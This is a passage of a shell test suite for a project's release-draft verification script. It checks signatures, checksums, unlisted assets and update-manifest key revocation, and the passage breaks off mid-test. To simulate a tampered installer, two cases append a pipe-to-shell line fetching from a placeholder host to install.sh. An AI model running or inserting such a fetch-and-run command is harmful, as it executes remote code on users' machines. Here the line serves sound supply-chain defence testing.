#!/bin/sh
# Tests of deploy/release/check-draft.sh, the check that release.yml's publish job runs on a draft right before it
# goes public (docs/m1/06-deploy-and-ci.md §9.3; README F15).
#
#   sh deploy/test/check-draft-test.sh
#
# `task test:sh` runs this file under dash and `bash --posix`, with CHECK_DRAFT_SHELL set to the same shell, which
# then runs check-draft.sh too (default: sh). Each case copies a draft made here, the way the sign job leaves it,
# changes one thing and runs the script on the copy: the draft as signed passes, and so do one without the cosign
# bundle and one with a hidden asset that the signed checksums.txt lists; an added asset, an added hidden one, a
# changed install.sh, a bad signature, a missing checksums line and the other cases below each fail, with the error
# of the check that is meant to catch them. The signing keys are made for the run with ssh-keygen (OpenSSH 8.1 or
# newer) and deleted with the drafts when the test ends: no key is committed.
#
# The desktop app's update manifest (docs/m2/06-windows-release.md §11.3, "M2 06" below): a draft with
# isshoni-desktop-update.json passes only with its signature by a key of UPDATE_SIGNERS (namespace and principal
# isshoni-update), and, when the manifest revokes keys, only when the backup key signed it; the cases are M2 06
# §11.3's list. Update keys and a backup key are made for the run too.
#
# It also checks that release.yml's publish job still runs the script, with both key files, between the last
# download of the draft and --draft=false, with exit 1 on a failure and no if: or continue-on-error: that would
# publish anyway; that the inline checks of sign and sign-dry keep their strictness before they sign (sha256sum
# --strict, then dotglob and nullglob set before the loop that exits 1 on an unlisted asset, so hidden files count)
# and let only the two signatures and the cosign bundle through; and it runs the scripts of sign's and sign-dry's
# manifest-signing steps, taken from release.yml, under bash: sign refuses a manifest that revokes keys unless the
# key in RELEASE_UPDATE_SIGNING_KEY is update_signers' backup key, and what both sign passes check-draft.sh.
set -eu

# check-draft.sh writes its errors as annotations in GitHub Actions; the cases want the plain lines, and CI runs
# this file in Actions. One case turns them on again.
unset GITHUB_ACTIONS

HERE=$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)
CHECK_DRAFT=$HERE/../release/check-draft.sh
RELEASE_YML=$HERE/../../.github/workflows/release.yml
SH=${CHECK_DRAFT_SHELL:-sh}

for tool in ssh-keygen sha256sum awk bash; do
  if ! command -v "$tool" >/dev/null 2>&1; then
    printf 'check-draft-test: %s is not installed\n' "$tool" >&2
    exit 1
  fi
done

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
trap 'exit 1' INT TERM
# The script runs from here, so that nothing depends on the working directory, which in publish is the checkout.
mkdir "$WORK/elsewhere"

PASSED=0
FAILED=0
RC=0
OUT=''

# ---------------------------------------------------------------------------------------------------------------
# The harness

# assert_eq NAME WANT GOT counts a check, and prints it when the two differ.
assert_eq() {
  if [ "$2" = "$3" ]; then
    PASSED=$((PASSED + 1))
    return 0
  fi
  FAILED=$((FAILED + 1))
  printf 'FAIL %s\n     want: %s\n     got:  %s\n' "$1" "$2" "$3"
}

# assert_contains NAME NEEDLE HAYSTACK counts a check that HAYSTACK has NEEDLE in it.
assert_contains() {
  case $3 in
  *"$2"*) PASSED=$((PASSED + 1)) ;;
  *)
    FAILED=$((FAILED + 1))
    printf 'FAIL %s\n     want it to contain: %s\n     got: %s\n' "$1" "$2" "$3"
    ;;
  esac
}

# assert_lacks NAME NEEDLE HAYSTACK counts a check that HAYSTACK does not have NEEDLE in it.
assert_lacks() {
  case $3 in
  *"$2"*)
    FAILED=$((FAILED + 1))
    printf 'FAIL %s\n     want it not to contain: %s\n     got: %s\n' "$1" "$2" "$3"
    ;;
  *) PASSED=$((PASSED + 1)) ;;
  esac
}

# check_in CWD ARGS... runs check-draft.sh with ARGS from the directory CWD, under the shell being tested. The exit
# code goes to RC, and stdout with stderr to OUT.
check_in() {
  ci_cwd=$1
  shift
  RC=0
  # shellcheck disable=SC2086 # CHECK_DRAFT_SHELL is a command with its options, such as "bash --posix"
  (cd "$ci_cwd" && $SH "$CHECK_DRAFT" "$@") >"$WORK/out" 2>&1 || RC=$?
  OUT=$(cat "$WORK/out")
}

# check DIR [SIGNERS] runs check-draft.sh on the draft DIR with the run's allowed_signers, or with SIGNERS.
check() {
  check_in "$WORK/elsewhere" "$1" "${2:-$SIGNERS}"
}

# expect_ok NAME DIR [SIGNERS]: the draft passes.
expect_ok() {
  check "$2" "${3:-$SIGNERS}"
  assert_eq "$1: exit code" 0 "$RC"
  assert_contains "$1: says ok" 'check-draft: ok:' "$OUT"
}

# expect_fail NAME DIR ERROR [SIGNERS]: the draft fails with exit code 1 and the error ERROR.
expect_fail() {
  check "$2" "${4:-$SIGNERS}"
  assert_eq "$1: exit code" 1 "$RC"
  assert_contains "$1: the error" "check-draft: $3" "$OUT"
  assert_lacks "$1: says no ok" 'check-draft: ok' "$OUT"
}

# sign DIR KEY [NAMESPACE] signs DIR/checksums.txt as the sign job does: an earlier signature goes first, since
# without a terminal ssh-keygen keeps it and still exits 0.
sign() {
  rm -f "$1/checksums.txt.sig"
  if ! ssh-keygen -Y sign -f "$2" -n "${3:-isshoni-checksums}" "$1/checksums.txt" >"$WORK/sign.out" 2>&1; then
    cat "$WORK/sign.out" >&2
    printf 'check-draft-test: ssh-keygen -Y sign failed (it needs OpenSSH 8.1 or newer)\n' >&2
    exit 1
  fi
}

# draft NAME prints the path of a new copy of the signed draft, named NAME.
draft() {
  cp -R "$SIGNED" "$WORK/drafts/$1"
  printf '%s\n' "$WORK/drafts/$1"
}

# sum_line DIR NAME prints checksums.txt's line for DIR/NAME.
sum_line() {
  (cd "$1" && sha256sum "$2")
}

# drop_line DIR NAME removes NAME's line from DIR/checksums.txt.
drop_line() {
  awk -v name="$2" '$2 != name' "$1/checksums.txt" >"$WORK/checksums.new"
  cat "$WORK/checksums.new" >"$1/checksums.txt"
}

# The update manifest (M2 06 §8.2) and its signature.
MANIFEST=isshoni-desktop-update.json

# check_u DIR [UPDATE_SIGNERS] runs check-draft.sh on the draft DIR with the run's allowed_signers and its
# update_signers, or UPDATE_SIGNERS.
check_u() {
  check_in "$WORK/elsewhere" "$1" "$SIGNERS" "${2:-$UPDATE_SIGNERS}"
}

# expect_ok_u NAME DIR [UPDATE_SIGNERS]: the draft with a manifest passes.
expect_ok_u() {
  check_u "$2" "${3:-$UPDATE_SIGNERS}"
  assert_eq "$1: exit code" 0 "$RC"
  assert_contains "$1: says ok" 'check-draft: ok:' "$OUT"
}

# expect_fail_u NAME DIR ERROR [UPDATE_SIGNERS]: the draft with a manifest fails with exit code 1 and ERROR.
expect_fail_u() {
  check_u "$2" "${4:-$UPDATE_SIGNERS}"
  assert_eq "$1: exit code" 1 "$RC"
  assert_contains "$1: the error" "check-draft: $3" "$OUT"
  assert_lacks "$1: says no ok" 'check-draft: ok' "$OUT"
}

# sign_manifest DIR KEY [NAMESPACE] signs DIR's manifest as the sign job does (an earlier signature goes first).
sign_manifest() {
  rm -f "$1/$MANIFEST.sig"
  if ! ssh-keygen -Y sign -f "$2" -n "${3:-isshoni-update}" "$1/$MANIFEST" >"$WORK/sign.out" 2>&1; then
    cat "$WORK/sign.out" >&2
    printf 'check-draft-test: ssh-keygen -Y sign of the manifest failed\n' >&2
    exit 1
  fi
}

# write_manifest FILE [REVOKED...] writes a manifest as tools/desktoppkg manifest does (sorted keys, two spaces,
# LF): revokedKeys is the exact line `  "revokedKeys": [],` without REVOKED, and a list over several lines with.
write_manifest() {
  wm_file=$1
  shift
  {
    printf '{\n  "artifacts": [\n    {\n      "arch": "amd64",\n      "kind": "nsis",\n'
    printf '      "name": "isshoni-desktop_0.1.0_windows_amd64_setup.exe",\n      "os": "windows",\n'
    printf '      "sha256": "%s",\n      "size": 27,\n' "$(printf '%064d' 0)"
    printf '      "url": "https://github.com/MoonWX/isshoni/releases/download/v0.1.0/isshoni-desktop_0.1.0_windows_amd64_setup.exe"\n'
    printf '    }\n  ],\n  "channel": "stable",\n  "expiresAt": "2027-05-30T10:00:00.000Z",\n'
    printf '  "minVersion": "0.1.0",\n  "notesUrl": "https://github.com/MoonWX/isshoni/releases/tag/v0.1.0",\n'
    printf '  "product": "isshoni-desktop",\n  "publishedAt": "2026-12-01T10:00:00.000Z",\n'
    if [ $# -eq 0 ]; then
      printf '  "revokedKeys": [],\n'
    else
      printf '  "revokedKeys": [\n'
      wm_n=0
      for wm_key; do
        wm_n=$((wm_n + 1))
        if [ "$wm_n" -lt $# ]; then printf '    "%s",\n' "$wm_key"; else printf '    "%s"\n' "$wm_key"; fi
      done
      printf '  ],\n'
    fi
    printf '  "schema": 1,\n  "version": "0.1.0"\n}\n'
  } >"$wm_file"
}

# manifest_draft NAME KEY [REVOKED...] prints the path of a new copy of the signed draft, named NAME, with a manifest
# (revoking REVOKED) listed in a checksums.txt signed again by the release key, and signed by KEY.
manifest_draft() {
  md_dir=$(draft "$1")
  md_key=$2
  shift 2
  write_manifest "$md_dir/$MANIFEST" "$@"
  sum_line "$md_dir" "$MANIFEST" >>"$md_dir/checksums.txt"
  sign "$md_dir" "$KEY"
  sign_manifest "$md_dir" "$md_key"
  printf '%s\n' "$md_dir"
}

# step_script JOB STEP prints the run: block of the step named STEP in release.yml's job JOB, without its
# indentation.
step_script() {
  job "$1" | awk -v step="      - name: $2" '
    $0 == step { on = 1; next }
    on && /^      - name: / { exit }
    on && /^        run: \|$/ { run = 1; next }
    run && /^          / { print substr($0, 11); next }
    run && /^ *$/ { print ""; next }
    run { exit }'
}

# run_step JOB STEP DIR [KEY] runs the script of STEP in JOB under bash -eo pipefail (GitHub's bash) in DIR, with
# RUNNER_TEMP=DIR/runner-temp and RELEASE_UPDATE_SIGNING_KEY = the private key KEY (unset without it). The exit code
# goes to RC, and stdout with stderr to OUT.
run_step() {
  rs_dir=$3
  mkdir -p "$rs_dir/runner-temp"
  step_script "$1" "$2" >"$WORK/step.sh"
  if [ ! -s "$WORK/step.sh" ]; then
    printf 'check-draft-test: release.yml has no step "%s" with a run: block in its job %s\n' "$2" "$1" >&2
    exit 1
  fi
  rs_secret=''
  if [ -n "${4:-}" ]; then rs_secret=$(cat "$4"); fi
  RC=0
  (cd "$rs_dir" && RUNNER_TEMP="$rs_dir/runner-temp" RELEASE_UPDATE_SIGNING_KEY="$rs_secret" \
    bash --noprofile --norc -eo pipefail "$WORK/step.sh") >"$WORK/out" 2>&1 || RC=$?
  OUT=$(cat "$WORK/out")
}

# ---------------------------------------------------------------------------------------------------------------
# The keys and the draft

# The release key, another key, and the allowed_signers file that deploy/keys/allowed_signers would be (06 §9.4).
mkdir "$WORK/keys" "$WORK/drafts"
KEY=$WORK/keys/release-key
OTHER_KEY=$WORK/keys/other-key
ssh-keygen -q -t ed25519 -N '' -C check-draft-test -f "$KEY"
ssh-keygen -q -t ed25519 -N '' -C check-draft-test-other -f "$OTHER_KEY"
SIGNERS=$WORK/keys/allowed_signers
printf 'isshoni-release namespaces="isshoni-checksums" %s\n' "$(cat "$KEY.pub")" >"$SIGNERS"

# The update key, its backup and the update_signers file that deploy/keys/update_signers would be (M2 06 §8.3), with
# a comment line as the committed file may have.
UPDATE_KEY=$WORK/keys/update-key
BACKUP_KEY=$WORK/keys/update-backup-key
ssh-keygen -q -t ed25519 -N '' -C isshoni-update-1 -f "$UPDATE_KEY"
ssh-keygen -q -t ed25519 -N '' -C isshoni-update-backup-1 -f "$BACKUP_KEY"
UPDATE_SIGNERS=$WORK/keys/update_signers
{
  printf '# the update keys of the test\n'
  printf 'isshoni-update namespaces="isshoni-update" %s\n' "$(cat "$UPDATE_KEY.pub")"
  printf 'isshoni-update namespaces="isshoni-update" %s\n' "$(cat "$BACKUP_KEY.pub")"
} >"$UPDATE_SIGNERS"
# A fingerprint for the revocation cases (the value is never checked against a key here).
REVOKED=SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# A draft as the sign job leaves it, with the asset names of 06 §3 (fewer of them): goreleaser's checksums.txt over
# every archive, package, SBOM, install.sh and compose file; its cosign bundle, which checksums.txt does not list;
# and checksums.txt.sig.
SIGNED=$WORK/signed
mkdir "$SIGNED"
for asset in isshoni_0.1.0_linux_amd64.tar.gz isshoni_0.1.0_linux_amd64.tar.gz.sbom.json \
  isshoni_0.1.0_linux_arm64.tar.gz isshoni_0.1.0_amd64.deb isshoni-0.1.0-1.x86_64.rpm install.sh compose.yaml; do
  printf 'the asset %s of the test release\n' "$asset" >"$SIGNED/$asset"
  sum_line "$SIGNED" "$asset" >>"$SIGNED/checksums.txt"
done
printf '{"mediaType": "application/vnd.dev.sigstore.bundle.v0.3+json"}\n' >"$SIGNED/checksums.txt.sigstore.json"
sign "$SIGNED" "$KEY"

# ---------------------------------------------------------------------------------------------------------------
# Drafts that pass

test_good() {
  d=$(draft good)
  expect_ok 'the draft as signed' "$d"
  assert_contains 'the draft as signed: counts every asset' 'each of the 7 assets' "$OUT"

  d=$(draft no-bundle)
  rm "$d/checksums.txt.sigstore.json"
  expect_ok 'without the cosign bundle' "$d"

  # A hidden asset that the signed checksums.txt lists passes: hidden files are checked, not refused by name.
  d=$(draft hidden-listed)
  printf 'listed\n' >"$d/.listed"
  sum_line "$d" .listed >>"$d/checksums.txt"
  sign "$d" "$KEY"
  expect_ok 'a hidden asset that checksums.txt lists' "$d"
  assert_contains 'a hidden asset that checksums.txt lists: counted' 'each of the 8 assets' "$OUT"

  # The line form "<hex> *NAME" (sha256sum's binary mode) lists NAME too.
  d=$(draft binary-mode)
  sed 's/  install\.sh$/ *install.sh/' "$d/checksums.txt" >"$WORK/checksums.new"
  cat "$WORK/checksums.new" >"$d/checksums.txt"
  sign "$d" "$KEY"
  expect_ok 'a "<hex> *NAME" line' "$d"

  # Relative names, as publish gives them (rel deploy/keys/allowed_signers, from the checkout).
  check_in "$WORK" drafts/good keys/allowed_signers
  assert_eq 'relative names: exit code' 0 "$RC"
  assert_contains 'relative names: says ok' 'check-draft: ok:' "$OUT"
}

# ---------------------------------------------------------------------------------------------------------------
# Assets that no signature covers (check 3)

test_unlisted() {
  d=$(draft added-asset)
  printf 'added\n' >"$d/isshoni_0.1.0_linux_riscv64.tar.gz"
  expect_fail 'an added asset' "$d" \
    'the draft has isshoni_0.1.0_linux_riscv64.tar.gz, which checksums.txt does not list'

  d=$(draft added-hidden)
  printf 'hidden\n' >"$d/.hidden"
  expect_fail 'an added hidden file' "$d" 'the draft has .hidden, which checksums.txt does not list'

  # Names are compared whole: one that starts like a listed one, is the start of one or is its end is not listed.
  d=$(draft longer-name)
  printf 'backup\n' >"$d/install.sh.orig"
  expect_fail 'a name that extends a listed one' "$d" 'the draft has install.sh.orig, which checksums.txt does not list'
  d=$(draft shorter-name)
  printf 'shorter\n' >"$d/isshoni_0.1.0_linux_amd64.tar"
  expect_fail 'a name that starts a listed one' "$d" \
    'the draft has isshoni_0.1.0_linux_amd64.tar, which checksums.txt does not list'
  d=$(draft name-suffix)
  printf 'suffix\n' >"$d/amd64.tar.gz"
  expect_fail 'a name that ends a listed one' "$d" 'the draft has amd64.tar.gz, which checksums.txt does not list'

  # Every unlisted asset is named, not only the first.
  d=$(draft two-added)
  printf 'one\n' >"$d/a-first"
  printf 'two\n' >"$d/z-second"
  expect_fail 'two added assets: the first' "$d" 'the draft has a-first, which checksums.txt does not list'
  assert_contains 'two added assets: the second' 'check-draft: the draft has z-second, which' "$OUT"

  d=$(draft added-directory)
  mkdir "$d/extra"
  expect_fail 'an added directory' "$d" 'the draft has extra, which checksums.txt does not list'

  # The asset is there with its checksum, but its line is gone from checksums.txt, which the key signed again.
  d=$(draft missing-line)
  drop_line "$d" compose.yaml
  sign "$d" "$KEY"
  expect_fail 'a missing checksums line' "$d" 'the draft has compose.yaml, which checksums.txt does not list'

  # The exceptions are by exact name: a hidden copy of checksums.txt is an asset like any other.
  d=$(draft hidden-checksums)
  cp "$d/checksums.txt" "$d/.checksums.txt"
  expect_fail 'a hidden copy of checksums.txt' "$d" 'the draft has .checksums.txt, which checksums.txt does not list'
}

# ---------------------------------------------------------------------------------------------------------------
# Assets that differ from checksums.txt (check 2)

test_checksums() {
  d=$(draft changed-install)
  printf 'curl https://example.invalid/x | sh\n' >>"$d/install.sh"
  expect_fail 'a changed install.sh' "$d" 'an asset that checksums.txt lists is missing or does not match it'
  assert_contains 'a changed install.sh: sha256sum names it' 'install.sh: FAILED' "$OUT"

  d=$(draft missing-asset)
  rm "$d/isshoni_0.1.0_linux_arm64.tar.gz"
  expect_fail 'a missing asset' "$d" 'an asset that checksums.txt lists is missing or does not match it'

  # --strict: a malformed line fails, even in a checksums.txt that the key signed.
  d=$(draft malformed-line)
  printf 'not a checksum line\n' >>"$d/checksums.txt"
  sign "$d" "$KEY"
  expect_fail 'a malformed checksums line' "$d" \
    'an asset that checksums.txt lists is missing or does not match it, or checksums.txt has a malformed line'
  assert_contains 'a malformed checksums line: sha256sum says so' 'improperly formatted' "$OUT"
}

# ---------------------------------------------------------------------------------------------------------------
# The signature (check 1), which comes first

test_signature() {
  # The changed install.sh with checksums.txt changed to match: the signature no longer holds.
  d=$(draft changed-install-and-sums)
  printf 'curl https://example.invalid/x | sh\n' >>"$d/install.sh"
  drop_line "$d" install.sh
  sum_line "$d" install.sh >>"$d/checksums.txt"
  expect_fail 'a changed install.sh with checksums.txt to match' "$d" 'checksums.txt has no valid signature'
  assert_lacks 'a changed install.sh with checksums.txt to match: stops at the signature' 'install.sh: OK' "$OUT"

  # And signed again, by a key that allowed_signers doesn't have.
  sign "$d" "$OTHER_KEY"
  expect_fail 'a changed install.sh with checksums.txt to match, signed by another key' "$d" \
    'checksums.txt has no valid signature'

  d=$(draft other-key)
  sign "$d" "$OTHER_KEY"
  expect_fail 'a signature by another key' "$d" 'checksums.txt has no valid signature'

  d=$(draft other-namespace)
  sign "$d" "$KEY" file
  expect_fail 'a signature by the key for another namespace' "$d" 'checksums.txt has no valid signature'

  d=$(draft broken-signature)
  printf 'not a signature\n' >"$d/checksums.txt.sig"
  expect_fail 'a broken signature' "$d" 'checksums.txt has no valid signature'

  d=$(draft no-signature)
  rm "$d/checksums.txt.sig"
  expect_fail 'no signature' "$d" 'the draft has no checksums.txt.sig'

  d=$(draft no-checksums)
  rm "$d/checksums.txt"
  expect_fail 'no checksums.txt' "$d" 'the draft has no checksums.txt'

  # The line is gone, and nobody signed again: the signature catches it before the asset list does.
  d=$(draft missing-line-unsigned)
  drop_line "$d" compose.yaml
  expect_fail 'a missing checksums line, not signed again' "$d" 'checksums.txt has no valid signature'
  assert_lacks 'a missing checksums line, not signed again: stops at the signature' 'does not list' "$OUT"

  # An unlisted asset and a bad signature: only the signature is reported, since it comes first.
  d=$(draft both)
  printf 'added\n' >"$d/extra.tar.gz"
  sign "$d" "$OTHER_KEY"
  expect_fail 'a bad signature and an added asset' "$d" 'checksums.txt has no valid signature'
  assert_lacks 'a bad signature and an added asset: stops at the signature' 'extra.tar.gz' "$OUT"

  # allowed_signers: empty, missing, the key for another principal or for another namespace.
  d=$(draft good-again)
  : >"$WORK/keys/empty_signers"
  expect_fail 'an empty allowed_signers' "$d" \
    "$WORK/keys/empty_signers is missing or empty, so no key can check the signature" "$WORK/keys/empty_signers"
  expect_fail 'no allowed_signers' "$d" \
    "$WORK/keys/no_such_file is missing or empty, so no key can check the signature" "$WORK/keys/no_such_file"
  printf 'someone-else namespaces="isshoni-checksums" %s\n' "$(cat "$KEY.pub")" >"$WORK/keys/other_principal"
  expect_fail 'the key for another principal' "$d" 'checksums.txt has no valid signature' \
    "$WORK/keys/other_principal"
  printf 'isshoni-release namespaces="file" %s\n' "$(cat "$KEY.pub")" >"$WORK/keys/other_namespace"
  expect_fail 'the key for another namespace' "$d" 'checksums.txt has no valid signature' \
    "$WORK/keys/other_namespace"
}

# ---------------------------------------------------------------------------------------------------------------
# The update manifest (checks 4 and 5, M2 06 §11.3)

test_manifest() {
  d=$(manifest_draft manifest-good "$UPDATE_KEY")
  expect_ok_u 'a signed manifest' "$d"
  assert_contains 'a signed manifest: counts it as an asset' 'each of the 8 assets' "$OUT"
  assert_contains 'a signed manifest: says it revokes nothing' \
    "$MANIFEST is signed by an update key and revokes no key" "$OUT"

  # The other spelling that desktoppkg could write for an empty list (a last key, without the comma).
  d=$(manifest_draft manifest-no-comma "$UPDATE_KEY")
  sed 's/^  "revokedKeys": \[\],$/  "revokedKeys": []/' "$d/$MANIFEST" >"$WORK/manifest.new"
  cat "$WORK/manifest.new" >"$d/$MANIFEST"
  drop_line "$d" "$MANIFEST"
  sum_line "$d" "$MANIFEST" >>"$d/checksums.txt"
  sign "$d" "$KEY"
  sign_manifest "$d" "$UPDATE_KEY"
  expect_ok_u 'an empty revokedKeys without a comma' "$d"
  assert_contains 'an empty revokedKeys without a comma: revokes nothing' 'revokes no key' "$OUT"

  # The backup key may sign a manifest that revokes nothing too.
  d=$(manifest_draft manifest-backup "$BACKUP_KEY")
  expect_ok_u 'a manifest signed by the backup key' "$d"

  d=$(manifest_draft manifest-no-sig "$UPDATE_KEY")
  rm "$d/$MANIFEST.sig"
  expect_fail_u 'a missing manifest signature' "$d" "the draft has no $MANIFEST.sig"

  d=$(manifest_draft manifest-checksums-key "$KEY")
  expect_fail_u 'a manifest signed by the checksums key' "$d" "$MANIFEST has no valid signature by a key of"

  d=$(manifest_draft manifest-checksums-namespace "$UPDATE_KEY")
  sign_manifest "$d" "$UPDATE_KEY" isshoni-checksums
  expect_fail_u 'the update key'"'"'s signature in the namespace isshoni-checksums' "$d" \
    "$MANIFEST has no valid signature by a key of"

  # A changed manifest, listed again in a checksums.txt that the release key signed again, but with the signature
  # of the manifest as it was: checks 1 to 3 pass, check 4 does not.
  d=$(manifest_draft manifest-changed "$UPDATE_KEY")
  sed 's/"minVersion": "0.1.0"/"minVersion": "0.0.1"/' "$d/$MANIFEST" >"$WORK/manifest.new"
  cat "$WORK/manifest.new" >"$d/$MANIFEST"
  drop_line "$d" "$MANIFEST"
  sum_line "$d" "$MANIFEST" >>"$d/checksums.txt"
  sign "$d" "$KEY"
  expect_fail_u 'a changed manifest with the old signature' "$d" "$MANIFEST has no valid signature by a key of"
  assert_contains 'a changed manifest with the old signature: the checksums held' "$MANIFEST: OK" "$OUT"

  # The update keys for another principal.
  sed 's/^isshoni-update namespaces=/someone-else namespaces=/' "$UPDATE_SIGNERS" >"$WORK/keys/update_other_principal"
  d=$(manifest_draft manifest-other-principal "$UPDATE_KEY")
  expect_fail_u 'an UPDATE_SIGNERS for another principal' "$d" "$MANIFEST has no valid signature by a key of" \
    "$WORK/keys/update_other_principal"

  # The release keys as the update keys: no key of allowed_signers signs updates.
  expect_fail_u 'allowed_signers as UPDATE_SIGNERS' "$d" "$MANIFEST has no valid signature by a key of" "$SIGNERS"

  # An extra signature of another name is an asset like any other: only the manifest's own .sig is let through.
  d=$(manifest_draft manifest-extra-sig "$UPDATE_KEY")
  cp "$d/$MANIFEST.sig" "$d/install.sh.sig"
  expect_fail_u 'an extra .sig of another name' "$d" 'the draft has install.sh.sig, which checksums.txt does not list'
  d=$(manifest_draft manifest-extra-sig2 "$UPDATE_KEY")
  cp "$d/$MANIFEST.sig" "$d/isshoni-desktop-update.sig"
  expect_fail_u 'an extra .sig with a name like the manifest'"'"'s' "$d" \
    'the draft has isshoni-desktop-update.sig, which checksums.txt does not list'

  # The manifest itself must be listed: its signature covers it only for the app, not for check-draft.
  d=$(manifest_draft manifest-unlisted "$UPDATE_KEY")
  drop_line "$d" "$MANIFEST"
  sign "$d" "$KEY"
  expect_fail_u 'an unlisted manifest' "$d" "the draft has $MANIFEST, which checksums.txt does not list"

  # A manifest signature without a manifest.
  d=$(draft manifest-sig-only)
  cp "$WORK/drafts/manifest-good/$MANIFEST.sig" "$d/"
  expect_fail 'a manifest signature without a manifest' "$d" "the draft has $MANIFEST.sig but no $MANIFEST"

  # UPDATE_SIGNERS: required with a manifest (a usage error), and it must have keys.
  d=$(manifest_draft manifest-usage "$UPDATE_KEY")
  check "$d"
  assert_eq 'a manifest without UPDATE_SIGNERS: exit code' 2 "$RC"
  assert_contains 'a manifest without UPDATE_SIGNERS: the error' \
    "check-draft: the draft has $MANIFEST, so UPDATE_SIGNERS is needed" "$OUT"
  assert_lacks 'a manifest without UPDATE_SIGNERS: says no ok' 'check-draft: ok' "$OUT"
  : >"$WORK/keys/empty_update_signers"
  expect_fail_u 'an empty UPDATE_SIGNERS' "$d" \
    "$WORK/keys/empty_update_signers is missing or empty, so no key can check the signature of $MANIFEST" \
    "$WORK/keys/empty_update_signers"

  # A draft without a manifest passes with UPDATE_SIGNERS too (a release before the app).
  d=$(draft no-manifest-with-update-signers)
  expect_ok_u 'no manifest, with UPDATE_SIGNERS' "$d"

  # The signature of checksums.txt still comes first.
  d=$(manifest_draft manifest-bad-checksums-sig "$UPDATE_KEY")
  sign "$d" "$OTHER_KEY"
  expect_fail_u 'a manifest draft with a bad checksums signature' "$d" 'checksums.txt has no valid signature'
}

test_revocation() {
  # Apps honour revokedKeys only from the backup key (M2 06 §8.1, §8.12): signed by the active key, it fails.
  d=$(manifest_draft revoke-active "$UPDATE_KEY" "$REVOKED")
  expect_fail_u 'a revocation signed by the active key' "$d" \
    "$MANIFEST revokes keys (its revokedKeys is not empty) but is not signed by the backup key"
  d=$(manifest_draft revoke-backup "$BACKUP_KEY" "$REVOKED")
  expect_ok_u 'a revocation signed by the backup key' "$d"
  assert_contains 'a revocation signed by the backup key: says so' \
    "$MANIFEST is signed by the backup update key and revokes keys" "$OUT"
  d=$(manifest_draft revoke-backup-two "$BACKUP_KEY" "$REVOKED" SHA256:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB)
  expect_ok_u 'two revocations signed by the backup key' "$d"

  # Any spelling but the two exact lines counts as a revocation (fail closed): a CR, another indentation, a list
  # written on one line with something in it.
  cr=$(printf '\r')
  for variant in crlf indent inline; do
    d=$(manifest_draft "revoke-$variant" "$UPDATE_KEY")
    case $variant in
    crlf) sed "s/^  \"revokedKeys\": \[\],\$/  \"revokedKeys\": [],$cr/" "$d/$MANIFEST" >"$WORK/manifest.new" ;;
    indent) sed 's/^  "revokedKeys": \[\],$/   "revokedKeys": [],/' "$d/$MANIFEST" >"$WORK/manifest.new" ;;
    inline) sed 's/^  "revokedKeys": \[\],$/  "revokedKeys": ["'"$REVOKED"'"],/' "$d/$MANIFEST" >"$WORK/manifest.new" ;;
    esac
    cat "$WORK/manifest.new" >"$d/$MANIFEST"
    drop_line "$d" "$MANIFEST"
    sum_line "$d" "$MANIFEST" >>"$d/checksums.txt"
    sign "$d" "$KEY"
    sign_manifest "$d" "$UPDATE_KEY"
    expect_fail_u "revokedKeys spelled another way ($variant), signed by the active key" "$d" \
      "$MANIFEST revokes keys (its revokedKeys is not empty) but is not signed by the backup key"
  done

  # The backup line is the one with the comment isshoni-update-backup-<n>, and there is exactly one.
  d=$(manifest_draft revoke-no-backup-line "$BACKUP_KEY" "$REVOKED")
  sed 's/ isshoni-update-backup-1$/ isshoni-update-2/' "$UPDATE_SIGNERS" >"$WORK/keys/update_no_backup"
  expect_fail_u 'a revocation with no backup line in UPDATE_SIGNERS' "$d" \
    "$WORK/keys/update_no_backup has 0 backup lines (key comment isshoni-update-backup-<n>), not one" \
    "$WORK/keys/update_no_backup"
  {
    cat "$UPDATE_SIGNERS"
    printf 'isshoni-update namespaces="isshoni-update" %s\n' "$(sed 's/ isshoni-update-1$/ isshoni-update-backup-2/' "$UPDATE_KEY.pub")"
  } >"$WORK/keys/update_two_backups"
  expect_fail_u 'a revocation with two backup lines in UPDATE_SIGNERS' "$d" \
    "$WORK/keys/update_two_backups has 2 backup lines (key comment isshoni-update-backup-<n>), not one" \
    "$WORK/keys/update_two_backups"
  # update_signers checked out with CRLF still has its backup line.
  sed "s/\$/$cr/" "$UPDATE_SIGNERS" >"$WORK/keys/update_crlf"
  expect_ok_u 'a revocation signed by the backup key, UPDATE_SIGNERS with CRLF' "$d" "$WORK/keys/update_crlf"
}

# ---------------------------------------------------------------------------------------------------------------
# sign's and sign-dry's manifest steps, as release.yml runs them

# sign_job_dir NAME [REVOKED...] prints a new folder laid out as the sign job's: rel/ (a signed draft with a manifest
# and no manifest signature yet) and deploy/keys/update_signers.
sign_job_dir() {
  sj_dir=$WORK/sign-jobs/$1
  shift
  mkdir -p "$sj_dir/deploy/keys" "$sj_dir/keys"
  cp -R "$SIGNED" "$sj_dir/rel"
  write_manifest "$sj_dir/rel/$MANIFEST" "$@"
  sum_line "$sj_dir/rel" "$MANIFEST" >>"$sj_dir/rel/checksums.txt"
  sign "$sj_dir/rel" "$KEY"
  cp "$UPDATE_SIGNERS" "$sj_dir/deploy/keys/update_signers"
  printf '%s\n' "$sj_dir"
}

test_sign_steps() {
  step='Sign the update manifest'

  d=$(sign_job_dir active)
  run_step sign "$step" "$d" "$UPDATE_KEY"
  assert_eq 'sign: the update key signs a manifest that revokes nothing' 0 "$RC"
  assert_contains 'sign: verified with update_signers' 'Good "isshoni-update" signature for isshoni-update' "$OUT"
  assert_eq 'sign: no key file is left' 0 "$(find "$d/runner-temp" -type f | wc -l | tr -d ' ')"
  check_u "$d/rel"
  assert_eq 'sign: what it signed passes check-draft.sh' 0 "$RC"

  # Again, over a signature of an earlier run, which must not stay (ssh-keygen keeps it without a terminal).
  cp "$WORK/drafts/manifest-checksums-key/$MANIFEST.sig" "$d/rel/$MANIFEST.sig"
  run_step sign "$step" "$d" "$UPDATE_KEY"
  assert_eq 'sign: a second run over an old signature' 0 "$RC"
  check_u "$d/rel"
  assert_eq 'sign: a second run over an old signature passes check-draft.sh' 0 "$RC"

  d=$(sign_job_dir revoke-active "$REVOKED")
  run_step sign "$step" "$d" "$UPDATE_KEY"
  assert_eq 'sign: refuses a revocation with the active key: exit code' 1 "$RC"
  assert_contains 'sign: refuses a revocation with the active key: the error' 'is not the backup key of' "$OUT"
  assert_eq 'sign: refuses a revocation with the active key: no signature' no \
